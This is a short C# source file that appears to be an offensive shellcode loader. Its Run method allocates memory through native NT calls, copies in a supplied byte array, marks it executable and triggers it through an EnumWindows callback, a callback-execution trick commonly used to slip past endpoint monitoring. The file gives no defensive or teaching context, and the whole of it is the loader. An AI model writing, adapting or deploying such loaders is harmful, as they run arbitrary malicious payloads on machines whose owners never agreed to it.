using System;
using System.Runtime.InteropServices;

static class NtCallback
{
    internal static bool Run(byte[] sc)
    {
        IntPtr baseAddr = IntPtr.Zero;
        IntPtr sz = (IntPtr)sc.Length;

        int status = NtApi.NtAllocateVirtualMemory(
            NtApi.CurrentProcess, ref baseAddr, IntPtr.Zero, ref sz,
            NtApi.MemCommit | NtApi.MemReserve, NtApi.PageReadWrite);
        if (!NtApi.NtSuccess(status))
            return false;

        Marshal.Copy(sc, 0, baseAddr, sc.Length);

        sz = (IntPtr)sc.Length;
        NtApi.NtProtectVirtualMemory(
            NtApi.CurrentProcess, ref baseAddr, ref sz,
            NtApi.PageExecuteRead, out _);

        IntPtr scAddr = baseAddr;
        NtApi.EnumWindowsProc callback = (hwnd, lParam) =>
        {
            Marshal.GetDelegateForFunctionPointer<Action>(lParam)();
            return false;
        };

        NtApi.EnumWindows(callback, scAddr);
        GC.KeepAlive(callback);
        return true;
    }
}
